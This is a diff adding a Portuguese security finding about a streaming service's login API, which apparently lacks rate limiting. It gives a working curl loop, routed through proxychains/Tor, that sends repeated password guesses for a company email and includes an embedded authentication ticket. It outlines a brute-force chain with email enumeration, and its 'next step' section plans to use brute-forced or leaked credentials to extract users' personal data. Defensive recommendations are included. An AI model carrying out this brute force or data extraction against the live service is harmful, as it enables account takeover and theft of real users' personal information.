@@ -1,0 +1,52 @@
+# F-011 Login Endpoint sem Rate Limiting
+
+Alvo: netmovies-service.ottvs.com.br (API /v1/android/Login)
+Severidade: ALTA
+Timestamp: 2026-08-20T04:05:00Z
+
+## Reprodução
+```
+# 10 requisições consecutivas sem delay — NENHUMA bloqueada
+$ for i in $(seq 10); do
+    proxychains4 curl -s -o /dev/null -w "%{http_code}" \
+      -X POST https://netmovies-service.ottvs.com.br/v1/android/Login \
+      -H "Content-Type: application/json" \
+      -d '{"Username":"contato@netmovies.com.br","Password":"test'$i'","AuthenticationTicket":"netmovies@netmovies:a1c2af@#$","Platform":"web"}'
+    echo " req=$i"
+  done
+
+HTTP 200 req=1
+HTTP 200 req=2
+...
+HTTP 200 req=10
+
+# Tempos de resposta via Tor: 1.69s - 2.16s (media 1.96s)
+```
+
+## Interpretação
+O endpoint `/Login` NÃO implementa rate limiting. Todas as 10 requisições consecutivas retornaram HTTP 200 com `Result:-1` ("Usuário ou senha inválida"). Sem bloqueio por IP, sem CAPTCHA, sem atraso progressivo.
+
+Combinado com F-007 (VerifyUserExist para enumeração de emails), um ataque de **password brute force direcionado** é viável:
+1. Enumerar emails existentes via VerifyUserExist
+2. Para cada email, testar wordlist de senhas comuns via Login
+3. Sem bloqueio, centenas de tentativas por hora são possíveis (via Tor)
+
+## Impacto
+- **Password brute force** sem restrições contra qualquer conta da NetMovies
+- **Account takeover** de contas com senhas fracas
+- **Credential stuffing** em massa usando combinações de leaks
+- **Acesso a PII** (CPF, telefone, endereço) via GetUserInfo após login
+
+## Recomendação
+1. **IMEDIATO**: Implementar rate limiting no endpoint `/Login` (máx 5 tentativas/min/IP)
+2. Adicionar CAPTCHA após tentativas falhas
+3. Implementar delay progressivo (exponential backoff)
+4. Bloquear IPs após N tentativas falhas (ex: 20 em 1 hora)
+5. Notificar usuários sobre tentativas de login suspeitas
+6. Exigir 2FA para acesso a dados sensíveis
+
+## Próximo passo
+Se conseguir uma credencial válida (via brute force ou leak), usar para:
+- Extrair PII via GetUserInfo
+- Listar assinaturas via GetSubscriptions
+- Acessar perfis via GetProfiles
